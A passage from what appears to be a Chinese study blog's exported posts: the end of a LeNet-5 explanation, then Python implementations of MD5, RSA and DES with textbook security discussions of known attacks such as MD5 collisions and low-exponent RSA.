有6个14×14的特征图。特征图中的每个单元与C1中相对应特征图的2×2邻域相连接。S2层每个单元的4个输入相加，乘以一个可训练参数，再加上一个可训练偏置。结果通过sigmoid函数计算。可训练系数和偏置控制着sigmoid函数的非线性程度。如果系数比较小，那么运算近似于线性运算，亚采样相当于模糊图像。如果系数比较大，根据偏置的大小亚采样可以被看成是有噪声的“或”运算或者有噪声的“与”运算。每个单元的2×2感受野并不重叠，因此S2中每个特征图的大小是C1中特征图大小的1/4（行和列各1/2）。S2层有12个可训练参数和5880个连接。 lXYDQU.jpg 图：卷积和子采样过程：卷积过程包括：用一个可训练的滤波器fx去卷积一个输入的图像（第一阶段是输入的图像，后面的阶段就是卷积特征map了），然后加一个偏置bx，得到卷积层Cx。子采样过程包括：每邻域四个像素求和变为一个像素，然后通过标量Wx+1加权，再增加偏置bx+1，然后通过一个sigmoid激活函数，产生一个大概缩小四倍的特征映射图Sx+1。 所以从一个平面到下一个平面的映射可以看作是作卷积运算，S-层可看作是模糊滤波器，起到二次特征提取的作用。隐层与隐层之间空间分辨率递减，而每层所含的平面数递增，这样可用于检测更多的特征信息。 LeNet-5第三层：卷积层C3输入：S2中所有6个或者几个特征map组合 卷积核大小：5×5 卷积核种类：16 输出featureMap大小：10×10 C3中的每个特征map是连接到S2中的所有6个或者几个特征map的，表示本层的特征map是上一层提取到的特征map的不同组合 存在的一个方式是：C3的前6个特征图以S2中3个相邻的特征图子集为输入。接下来6个特征图以S2中4个相邻特征图子集为输入。然后的3个以不相邻的4个特征图子集为输入。最后一个将S2中所有特征图为输入。 则：可训练参数：6×（3×25+1）+6×（4×25+1）+3×（4×25+1）+（25×6+1）=1516 连接数：10×10×1516=151600 C3层是一个卷积层，卷积和和C1相同，不同的是C3的每个节点与S2中的多个图相连。 每个图与S2层的连接的方式如下表 所示。C3与S2中前3个图相连的卷积结构见下图.这种不对称的组合连接的方式有利于提取多种组合特征。 LeNet-5第四层：池化层S4输入：10×10 采样区域：2×2 采样方式：4个输入相加，乘以一个可训练参数，再加上一个可训练偏置。结果通过sigmoid 采样种类：16 输出featureMap大小：5×5（10/2） 神经元数量：5×5×16=400 可训练参数：2×16=32（和的权+偏置） 连接数：16×（2×2+1）×5×5=2000 S4中每个特征图的大小是C3中特征图大小的1/4 S4层是一个下采样层，由16个55大小的特征图构成。特征图中的每个单元与C3中相应特征图的22邻域相连接，跟C1和S2之间的连接一样。S4层有32个可训练参数（每个特征图1个因子和一个偏置）和2000个连接。 LeNet-5第五层：全连接层C5输入：S4层的全部16个单元特征map（与s4全相连） 卷积核大小：5×5 卷积核种类：120 输出featureMap大小：1×1（5-5+1） 可训练参数/连接：120×（16×5×5+1）=48120 C5层是一个全连接层。由于S4层的16个图的大小为5x5，与卷积核的大小相同，所以卷积后形成的图的大小为1x1。这里形成120个卷积结果。每个都与上一层的16个图相连。所以共有(5x5x16+1)x120 = 48120个参数，同样有48120个连接。 LeNet-5第六层：全连接层F6输入：c5 120维向量 计算方式：计算输入向量和权重向量之间的点积，再加上一个偏置，结果通过sigmoid函数 可训练参数:84*(120+1)=10164 F6层有84个单元（之所以选这个数字的原因来自于输出层的设计），与C5层全相连。有10164个可训练参数。如同经典神经网络，F6层计算输入向量和权重向量之间的点积，再加上一个偏置。然后将其传递给sigmoid函数产生单元i的一个状态。 LeNet-5第七层：全连接层Output输出层由欧式径向基函数（Euclidean Radial Basis Function）单元组成，每类一个单元，每个有84个输入。换句话说，每个输出RBF单元计算输入向量和参数向量之间的欧式距离。输入离参数向量越远，RBF输出的越大。一个RBF输出可以被理解为衡量输入模式和与RBF相关联类的一个模型的匹配程度的惩罚项。用概率术语来说，RBF输出可以被理解为F6层配置空间的高斯分布的负log-likelihood。给定一个输入模式，损失函数应能使得F6的配置与RBF参数向量（即模式的期望分类）足够接近。这些单元的参数是人工选取并保持固定的（至少初始时候如此）。这些参数向量的成分被设为-1或1。虽然这些参数可以以-1和1等概率的方式任选，或者构成一个纠错码，但是被设计成一个相应字符类的7*12大小（即84）的格式化图片。这种表示对识别单独的数字不是很有用，但是对识别可打印ASCII集中的字符串很有用。 使用这种分布编码而非更常用的“1 of N”编码用于产生输出的另一个原因是，当类别比较大的时候，非分布编码的效果比较差。原因是大多数时间非分布编码的输出必须为0。这使得用sigmoid单元很难实现。另一个原因是分类器不仅用于识别字母，也用于拒绝非字母。使用分布编码的RBF更适合该目标。因为与sigmoid不同，他们在输入空间的较好限制的区域内兴奋，而非典型模式更容易落到外边。RBF参数向量起着F6层目标向量的角色。需要指出这些向量的成分是+1或-1，这正好在F6 sigmoid的范围内，因此可以防止sigmoid函数饱和。实际上，+1和-1是sigmoid函数的最大弯曲的点处。这使得F6单元运行在最大非线性范围内。必须避免sigmoid函数的饱和，因为这将会导致损失函数较慢的收敛和病态问题。 训练过程这个的话建议看一些机器学习的网课，比如网易云课堂上吴恩达的课。 一维Lenet-5 https://github.com/1187100546/CNN_LeNet-5_onedimension 参考链接 https://blog.csdn.net/zrh_CSDN/article/details/81267873 https://www.jianshu.com/p/ce609f9b5910 https://blog.csdn.net/qiaofangjie/article/details/16826849 http://blog.csdn.net/zouxy09/article/details/9993371 http://blog.csdn.net/celerychen2009/article/details/8973218 🚩推荐阅读DenseNet神经网络结构BERT的前世今生BERT的前世今生]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>CNN</tag>
        <tag>Deep Learning</tag>
        <tag>神经网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5加密]]></title>
    <url>%2F2020%2F01%2F12%2Fmd5%2F</url>
    <content type="text"><![CDATA[密码学里的MD5加密。 MD5算法原理消息填充 使消息长度模512=448如果消息长度模512恰等于448，增加512个填充比特。即填充的个数为1~512，填充方法：第1比特为1，其余全部为0 将消息长度转换为64比特的数值，如果长度超过64比特所能表示的数据长度，值保留最后64比特添加到填充数据后面，使数据为512比特的整数倍 512比特按32比特分为16组 注：64位数据长度存储的时候是小端序 初始化链接变量使用4个32位的寄存器A， B，C， D存放4个固定的32位整型参数，用于第一轮迭代，这里需要注意的是，寄存器的值要转化为小端序。 $$ A=0x01234567\\ B=0x89abcdef\\ C=0xfedcba98\\ D=0x76543210 $$ 分组处理与分组密码分组处理相似，有4轮步骤，将512比特的消息分组平均分为16个子分组，每个子分组有32比特，参与每一轮的的16步运算，每步输入是4个32比特的链接变量和一个32位的的消息子分组，经过这样的64步之后得到4个寄存器的值分别与输入的链接变量进行模加。 步函数 lTYEY4.png 该函数包括 4 轮，每轮 16 步，上一步的链接变量 D, B, C 直接赋值给下一步的链接变量 A, C, D。 A 先和非线性函数的结果加一下，结果再和 M[j] 加一下，结果再和 T[i] 加一下，结果再循环左移 s 次，结果再和原来的 B 加一下，最后的得到新 B。 非线性函数： lTtd29.png 代码实现消息填充length = struct.pack(&#39;&lt;Q&#39;, len(message)*8) #原消息长度64位比特的添加格式 while len(message) &gt; 64: solve(message[:64]) message = message[64:] #长度不足64位消息自行填充 message += b&#39;\x80&#39; message += b&#39;\x00&#39; * (56 - len(message) % 64) message += length solve(message[:64]) 初始化链接变量A, B, C, D = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) 分组处理及步函数def solve(chunk): global A global B global C global D w = list(struct.unpack(&#39;&lt;&#39; + &#39;I&#39; * 16, chunk)) #分成16个组，I代表1组32位 a, b, c, d = A, B, C, D for i in range(64): #64轮运算 if i &lt; 16: #每一轮运算只用到了b,c,d三个 f = ( b &amp; c)|((~b) &amp; d) flag = i #用于标识处于第几组信息 elif i &lt; 32: f = (b &amp; d)|(c &amp; (~d)) flag = (5 * i +1) %16 elif i &lt; 48: f = (b ^ c ^ d) flag = (3 * i + 5)% 16 else: f = c ^(b |(~d)) flag = (7 * i ) % 16 tmp = b + lrot((a + f + k[i] + w[flag])&amp; 0xffffffff,r[i]) #&amp;0xffffffff为了类型转换 a, b, c, d = d, tmp &amp; 0xffffffff, b, c A = (A + a) &amp; 0xffffffff B = (B + b) &amp; 0xffffffff C = (C + c) &amp; 0xffffffff D = (D + d) &amp; 0xffffffff 运行结果 lTtW2d.png 找一个在线加密的网站验证一下 lTtfxA.png 安全性分析攻击者的主要目标不是恢复原始的明文，而是用非法消息替代合法消息进行伪造和欺骗，对哈希函数的攻击也是寻找碰撞的过程。 基本攻击方法： （1）穷举攻击：能对任何类型的Hash函数进行攻击 最典型方法是“生日攻击”：给定初值𝐻0=H(M)，寻找𝑀’≠ 𝑀，使ℎ(𝑀’)= 𝐻0 （2）密码分析法：依赖于对Hash函数的结构和代数性质分析，采用针对Hash函数弱性质的方法进行攻击。这类攻击方法有中间相遇攻击、修正分组攻击和差分分析等 MD5算法中，输出的每一位都是输入的每一位的函数，逻辑函数F、G、H、I的复杂迭代使得输出对输入的依赖非常小 但Berson证明，对单轮的MD5算法，利用差分分析，可以在合理时间内找出碰撞的两条消息 MD5算法抗密码分析的能力较弱，生日攻击所需代价是试验264个消息 2004年8月17日，在美国加州圣巴巴拉召开的美密会（Crypto2004）上，中国的王小云、冯登国、来学嘉、于红波4位学者宣布，只需1小时就可找出MD5的碰撞（利用差分分析） 完整代码import struct import math import binascii lrot = lambda x,n: (x &lt;&lt; n)|(x &gt;&gt; 32- n) #循环左移的操作 #初始向量 A, B, C, D = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) # A, B, C, D = (0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210) #循环左移的位移位数 r = [ 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21 ] #使用正弦函数产生的位随机数，也就是书本上的T[i] k = [int(math.floor(abs(math.sin(i + 1)) * (2 ** 32))) for i in range(64)] def init_mess(message): global A global B global C global D A, B, C, D = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) # A, B, C, D = (0x01234567, 0x89ABCDEF, 0xFEDCBA98, 0x76543210) length = struct.pack(&#39;&lt;Q&#39;, len(message)*8) #原消息长度64位比特的添加格式 while len(message) &gt; 64: solve(message[:64]) message = message[64:] #长度不足64位消息自行填充 message += b&#39;\x80&#39; message += b&#39;\x00&#39; * (56 - len(message) % 64) message += length solve(message[:64]) def solve(chunk): global A global B global C global D w = list(struct.unpack(&#39;&lt;&#39; + &#39;I&#39; * 16, chunk)) #分成16个组，I代表1组32位 a, b, c, d = A, B, C, D for i in range(64): #64轮运算 if i &lt; 16: #每一轮运算只用到了b,c,d三个 f = ( b &amp; c)|((~b) &amp; d) flag = i #用于标识处于第几组信息 elif i &lt; 32: f = (b &amp; d)|(c &amp; (~d)) flag = (5 * i +1) %16 elif i &lt; 48: f = (b ^ c ^ d) flag = (3 * i + 5)% 16 else: f = c ^(b |(~d)) flag = (7 * i ) % 16 tmp = b + lrot((a + f + k[i] + w[flag])&amp; 0xffffffff,r[i]) #&amp;0xffffffff为了类型转换 a, b, c, d = d, tmp &amp; 0xffffffff, b, c A = (A + a) &amp; 0xffffffff B = (B + b) &amp; 0xffffffff C = (C + c) &amp; 0xffffffff D = (D + d) &amp; 0xffffffff def digest(): global A global B global C global D return struct.pack(&#39;&lt;IIII&#39;,A,B,C,D) def hex_digest(): return binascii.hexlify(digest()).decode() if __name__ == &#39;__main__&#39;: while True: mess = input(&quot;请输入你的信息:&quot;) init_mess(mess.encode()) out_put = hex_digest() print(type(out_put)) print (out_put) 🚩推荐阅读公钥密码RSA分组密码DES序列密码《图解密码技术》学习笔记之密码(二)《图解密码技术》学习笔记之密码(一)]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[公钥密码RSA]]></title>
    <url>%2F2020%2F01%2F12%2FRSA%2F</url>
    <content type="text"><![CDATA[密码学中的RSA加密。 RSA算法原理 密钥的生成 选择两个大素数 𝑝和𝑞,（𝑝≠𝑞，需要保密，步骤4以后建议销毁） 计算𝑛=𝑝×𝑞， (𝑛)=(𝑝－1)×(𝑞－1) 选择整数 𝑒 使 ((𝑛)，𝑒) =1, 1&lt;𝑒&lt; (𝑛) 计算𝑑，使𝑑=𝑒－1 𝑚𝑜𝑑 (𝑛), ​ 得到：公钥为{𝑒, 𝑛}； 私钥为{𝑑} 加密(用𝒆，𝒏)： 明文𝑀&lt;𝑛， 密文𝐶=𝑀^𝑒 (𝑚𝑜𝑑 𝑛). 解密(用𝒅，𝒏)： 密文𝐶， 明文𝑀 =𝐶^𝑑 (𝑚𝑜𝑑 𝑛) 大素数生成Miler-Rabin 算法： 对于大整数的素性测试，一般用 Miller-Rabin 算法。它是一个基于概率的算法，是费马小定理（若 n 是一个素数，则 an-1 ≡ 1 (mod n) ）的一个改进。要测试 n 是否为素数，首先将 n−1 分解为 2sd 。在每次测试开始时，先随机选一个介于 [1,n−1] 的整数 a ，之后如果对所有的 r∈[0,s−1] ，若admodn≠1 且 a2rd mod n≠−1，则 n 是合数。否则，n 有 3/4 的概率为素数。增加测试的次数，该数是素数的概率会越来越高。这样，我们就可以给定位数 n 的情况下随机生成数，然后再用 Miller-Rabin 算法验证它是不是素数，若是，则就用它，否则再随机生成其他数字，循环。Python 脚本如下： # 素性检验：采用 Miler-Rabin 检验法 def miller_rabin(n,k=80): if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for _ in range(k): a = random.randrange(2, n - 1) x = pow(a, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return True # 生成 b 位的素数 def genPrime(b=1024): while True: # the highest bit is 1 ans = &quot;1&quot; for i in range(b-2): ans += str(random.randint(0,1)) # the lowest bit is 1 ans += &quot;1&quot; ans = int(ans,2) if miller_rabin(ans): return ans 带模的幂运算原理：模重复平方运算，Python 代码如下： def FastMod(x, n, m): a = 1 b = x while True: temp = n if n % 2 == 1 : a = a * b % m b = b * b % m n = n//2 if temp &lt; 1 : return a 求逆运算扩展欧几里得法 def computeD(e, phi_n): (x, y, r) = extendedGCD(phi_n, e) # y maybe &lt; 0, so convert it if y &lt; 0: return phi_n + y return y # Extended Euclidean algorithm def extendedGCD(a, b): # a*xi + b*yi = ri if b == 0: return (1, 0, a) # a*x1 + b*y1 = a x1 = 1 y1 = 0 # a*x2 + b*y2 = b x2 = 0 y2 = 1 while b != 0: q = a // b # ri = r(i-2) % r(i-1) r = a % b a = b b = r # xi = x(i-2) - q*x(i-1) x = x1 - q*x2 x1 = x2 x2 = x # yi = y(i-2) - q*y(i-1) y = y1 - q*y2 y1 = y2 y2 = y return(x1, y1, a) 运行结果 lov9Nn.png 安全性分析RSA的安全性依赖于大数分解问题，目前，还未能从数学上证明由𝑐和𝑒计算出𝑚一定需要分解𝑛，然而，如果新方法能使密码分析者推算出𝑑，它也就成为大数分解的一个新方法 非对称加密算法中 1024 bit 密钥的强度相当于对称加密算法 80bit 密钥的强度。但是，从效率上，密钥长度增长一倍，公钥操作所需时间增加约 4 倍，私钥操作所需时间增加约 8 倍，公私钥生成时间约增长16倍。所以，我们要权衡一下效率和安全性。一般来说， 1024 bit 只能用于加密 最多117 字节的明文。 低加密指数攻击： 为了使加密高效，一般希望选取较小的加密指数 e ，但是 e 不能太小，否则容易遭到低加密指数攻击。 假设用户使用的密钥 e=3 。考虑到加密关系满足： C\equiv m^3\ mod\ n\\则容易得到： m^3=c+k\times n\\ m=\sqrt[3]{c+k\times n}攻击者可以从小到大枚举 k ，依次开三次根，直到开出整数为止。 低加密指数广播攻击： 还有一种情况是如果给 k 个用户发的都是同个低加密指数比如 e=3 ，在不同的模数 n1.n2,n3下 ，可由 CRT（中国剩余定理） 解出 m3 ，从而直接开三次根解出 m。 共模攻击： 场景：n 相同（让多个用户使用相同的模数 n ），但他们的公私钥对不同。这样，我们可以在已知 n,e1,e2,c1,c2 的情况下解出 m 。过程如下： 其实有个隐形的前提条件是： gcd(e_1,e_2)=1存在 s1,s2 使得： s_1e_1+s_2e_2=1又由 RSA 定义可知： c_1\equiv m^{e_1}\ mod\ n\\ c_2\equiv m^{e_2}\ mod \ n可得出： c_1^{s_1}c_2^{s_2}\equiv m\ mod\ n解出明文。 完整代码import random def FastMod(x, n, m): a = 1 b = x while True: temp = n if n % 2 == 1 : a = a * b % m b = b * b % m n = n//2 if temp &lt; 1 : return a def computeD(e, phi_n): (x, y, r) = extendedGCD(phi_n, e) if y &lt; 0: return phi_n + y return y def extendedGCD(a, b): if b == 0: return (1, 0, a) x1 = 1 y1 = 0 x2 = 0 y2 = 1 while b != 0: q = a // b r = a % b a = b b = r x = x1 - q*x2 x1 = x2 x2 = x y = y1 - q*y2 y1 = y2 y2 = y return(x1, y1, a) def str2Hex(m): return &quot;&quot;.join(&quot;{:02x}&quot;.format(ord(x)) for x in m) # 素性检验：采用 Miler-Rabin 检验法 def miller_rabin(n,k=80): if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for _ in range(k): a = random.randrange(2, n - 1) x = pow(a, s, n) if x == 1 or x == n - 1: continue for _ in range(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return True # 生成 b 位的素数 def genPrime(b=1024): while True: # the highest bit is 1 ans = &quot;1&quot; for i in range(b-2): ans += str(random.randint(0,1)) # the lowest bit is 1 ans += &quot;1&quot; ans = int(ans,2) if miller_rabin(ans): return ans def genE(phi_n): while True: e = genPrime(b=random.randint(3,13)) if e == 3 or e == 5: continue if phi_n%e != 0: return e def RSAEncrypt(m,n,e): m = int(str2Hex(m),16) c = pow(m,e,n) return c def RSADecrypt(c,d,n): m = pow(c,d,n) m = bytes.fromhex(&#39;{:x}&#39;.format(m)) return m def main(): # 生成两个大素数p和q print (&quot;Generate p and q ......&quot;) p = genPrime() q = genPrime() print (&quot;p = &quot;+str(p)) print (&quot;q = &quot;+str(q)) # 计算n = p*q n = p*q print (&quot;n = &quot;+str(n)) # 计算φ(n) = p*q phi_n = (p-1)*(q-1) print (&quot;\nGenerate e ......&quot;) # 生成一个和φ(n)互素的数e e = genE(phi_n) print (&quot;e = &quot;+str(e)) m = &quot;Hello world!&quot; # 加密算法 print (&quot;\n&quot;+8*&quot;*&quot;+&quot; Encryption &quot;+8*&quot;*&quot;) Ciphertext = RSAEncrypt(m,n,e) print (&quot;The Ciphertext is:\n\t&quot;+str(Ciphertext)) # 解密算法 print (&quot;\n&quot;+8*&quot;*&quot;+&quot; Decryption &quot;+8*&quot;*&quot;) # 使用私钥d，d是e模φ(n)的逆 d = computeD(e,phi_n) print (&quot;d = &quot;+str(d)) Plaintext = RSADecrypt(Ciphertext,d,n) print (&quot;The Plaintext is:\n\t&quot;+str(Plaintext)) if __name__ == &#39;__main__&#39;: main() 🚩推荐阅读MD5加密分组密码DES序列密码《图解密码技术》学习笔记之密码(二)《图解密码技术》学习笔记之密码(一)]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分组密码DES]]></title>
    <url>%2F2020%2F01%2F03%2Fdes%2F</url>
    <content type="text"><![CDATA[密码学中的DES加密。 DES算法原理基本结构DES是分组加密，将明文分成64位一组，密钥长度 64 比特（其中有效长度为 56 比特），8 的倍数位为奇校验位（保证每 8 位有奇数个 1）。 如图，64 比特的密钥经过置换选择和循环移位操作可生成 16 个 48 比特的子密钥。明文 m 经过初始置换 IP 后划分为左右两部分（各32 比特），经过 16 轮 Feistel 结果（其中最后一轮不做左右交换）再做一次逆置换 IP-1得到密文 c 。 loHUSg.png 加密方程： L_0R_0 \leftarrow IP\\ L_n\leftarrow R_{n-1}\\ R_n\leftarrow L_{n-1}\oplus f(R_{n-1},K_n)\\ c=\leftarrow IP^{-1}解密方程： R_{16}L_{16}\leftarrow IP\\ R_{n-1}\leftarrow L_n\\ L_{n-1}\leftarrow R_n\oplus f(L_nK_n)\\ m=IP^{-1}由此可见DES是一个对合运算。 密钥扩展用于生成迭代的子密钥。具体过程为： 64位初始密钥经过置换选择1 ( PC-1 ) 后变成 56 位，经过循环左移和置换选择2 ( PC-2 ) 后分别得到 16 个 48 位子密钥 Ki 用做每一轮的迭代运算。 PC-1 去掉了校验位， PC-2 去掉了9, 18, 22, 25, 35, 38, 43, 54 位。 loLkes.png F函数 先进行E-扩展：32比特扩展为48比特 将E盒扩展得到的48位输出与子密钥𝐾𝑖进行异或运算 l压缩替换S-盒，由8个S-盒构成, 每个S-盒都是6比特的输入，4比特的输出 P-置换对8个S-盒的输出进行变换 loLmWT.png 代码实现密钥扩展#PC-1盒 def key_change_1(st): key1_list = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4] #得到56位，去掉校验位 res = &quot;&quot; for i in key1_list: res+=st[i-1] return res #PC-2盒 def key_change_2(st): key2_list = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32] #压缩置换 #去掉9，18，22，25，35，38，43，54位得到48位 res = &quot;&quot; for i in key2_list: res+=st[i-1] return res #16轮迭代生成子密钥 def key_gen(st): key_list = []#子密钥表 key_change_res = key_change_1(st) #PC-1置换分成C，D两块 key_c = key_change_res[0:28] key_d = key_change_res[28:] for i in range(1,17): #共16轮 if (i==1) or (i==2) or (i==9) or (i==16):#按轮数循环左移 key_c = zuoyiwei(key_c,1) key_d = zuoyiwei(key_d,1) else: key_c = zuoyiwei(key_c,2) key_d = zuoyiwei(key_d,2) key_yiwei = key_c+key_d #压缩置换 key_res = key_change_2(key_yiwei) key_list.append(key_res) return key_list F函数#E盒扩展置换，将32位输出扩展至48位 def box_e(st): #E盒置换表 e_list = [32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23,24,25,24,25,26,27,28,29,28,29,30,31,32,1] res = &quot;&quot; for i in e_list: res +=st[i-1] return res #S盒代换盒 def box_s(st): j = 0 #8个S盒代换表 s_list = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]] res = &quot;&quot; for i in range(0,len(st),6):#6位输入，4位输出 begin_s = st[i:i+6] row = int(begin_s[0]+begin_s[5],2) col = int(begin_s[1:5],2) num = bin(s_list[j][row*16+col])[2:] for padd in range(0,4-len(num)): num = &quot;0&quot;+num res += num j = j+1 return res #P盒置换 def box_p(st): res = &quot;&quot; p_list = [16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25] for i in p_list: res +=st[i-1] return res #封装成F函数 def funcF(st,key): str_e_res = box_e(st) xor_res = xor(str_e_res,key) str_s_res = box_s(xor_res) str_p_res = box_p(str_s_res) return str_p_res IP置换与IP逆置换#初始IP置换 def begin_change(st): #置换表 change_list = [58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7] res =&quot;&quot; for i in change_list: res+=st[i-1] #因为列表是1-64，而数组是0-63，所以减一 return res #IP逆置换 def mov_IP(st): res = &quot;&quot; ip_list = [40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25] for i in ip_list: res += st[i-1] return res 加解密封装加密： #封装64位加密 def DESenc_test(mes,key): mes_bin = strtobin(mes)#明文转二进制 mes_IP = begin_change(mes_bin)#IP置换 key_bin = strtobin(key)#密钥转二进制 key_list = key_gen(key_bin)#生成子密钥 mes_left = mes_IP[0:32]#明文分两组32位 mes_right = mes_IP[32:] for i in range(0,15):#16轮F函数迭代 mes_tmp = mes_right right_f_res = funcF(mes_right,key_list[i]) mes_right = xor(right_f_res,mes_left) mes_left = mes_tmp fin_right = mes_right fin_left = xor(funcF(mes_right,key_list[15]),mes_left) fin = fin_left+fin_right fin = mov_IP(fin)#IP逆置换 return fin#返回密文 解密： #封装64位解密 def DESdec_test(cipher,key): #密文直接输64位2进制 #cipher = strtobin(str) key_bin = strtobin(key) key_list = key_gen(key_bin) cipher = begin_change(cipher) i = 15 cipher_left = cipher[0:32] cipher_right = cipher[32:] while i&gt;0: cipher_tmp = cipher_right cipher_right = xor(cipher_left,funcF(cipher_right,key_list[i])) cipher_left = cipher_tmp i = i -1 fin_left = xor(cipher_left,funcF(cipher_right,key_list[0])) fin_right = cipher_right fin = fin_left+fin_right fin = mov_IP(fin) my_plain = &quot;&quot; for j in range(0,len(fin),8): my_plain += chr(int(fin[j:j+8],2)) return my_plain 运行结果 loL50s.png CBC工作模式DES加密设计思路对于DES分组加密，每次加密完的结果与下一组的明文进行异或，这就是CBC（密码分组链接模式）。 loLxB9.png 代码实现这里采用的初始向量是“aaaaaaaa”. #cbc模式下加密 def cbc_desenc(mes,key): IV=&quot;aaaaaaaa&quot; res=&quot;&quot; i=0 cns=&quot;&quot; while mes[i:i+8]!=&quot;&quot;: if i==0: res+=DESenc_test(bintostr(xor(strtobin(IV),strtobin(mes[i:i+8]))),key) cns=DESenc_test(bintostr(xor(strtobin(IV),strtobin(mes[i:i+8]))),key) else: res+=DESenc_test(bintostr(xor(cns,strtobin(mes[i:i+8]))),key) cns=DESenc_test(bintostr(xor(cns,strtobin(mes[i:i+8]))),key) i=i+8 return res #cbc模式下解密 def cbc_desdec(cipher,key): res=&quot;&quot; IV=&quot;aaaaaaaa&quot; i=0 cns=&quot;&quot; while cipher[i:i+64]!=&quot;&quot;: if i==0: res+=bintostr(xor(strtobin(DESdec_test(cipher[i:i+64],key)),strtobin(IV))) cns=cipher[i:i+64] else: res+=bintostr(xor(strtobin(DESdec_test(cipher[i:i+64],key)),cns)) cns=cipher[i:i+64] i=i+64 return res 运行结果 loOAje.png 安全性分析安全性争论： S盒的设计准则还没有完全公开，人们仍然不知道S盒的构造中是否使用了进一步的设计准则 DES存在一些弱密钥和半弱密钥 DES的56位密钥无法抵抗穷举攻击 代数结构存在互补对称性 弱密钥： 给定初始密钥𝐾生成子密钥时，将种子密钥分成两个部分，如果𝐾使得这两部分的每一部分的所有位置全为0或1，则经子密钥产生器产生的各个子密钥都相同，即𝐾1=𝐾2=…=𝐾16，则称密钥𝐾为弱密钥（共有4个） 若𝐾为弱密钥，则对任意的64比特信息有： E_k(E_k(m))=m和D_k(D_k(m))=m半弱密钥： 把明文加密成相同的密文，即存在两个不同的密钥𝑘和𝑘′,使得𝐸𝑘 (𝑚)=𝐸(𝑘^′ ) (𝑚) 具有下述性质： 若𝑘和𝑘′为一对弱密钥，𝑚为明文组，则有： E_{k'}(E_k(m))=E_k(E_{k'}(m))=m互补性： 对明文𝑚逐位取补，记为𝑚 ̅，密钥𝐾逐位取补，记为𝑘 ̅ ， 若𝑐=𝐸𝑘(𝑚)，则有𝑐 ̅=𝐸_𝑘 ̅ (𝑚 ̅) ，称为算法上的互补性 由算法中两次异或运算的配置决定：两次异或运算一次在S盒之前，一次在P盒置换之后 若对DES 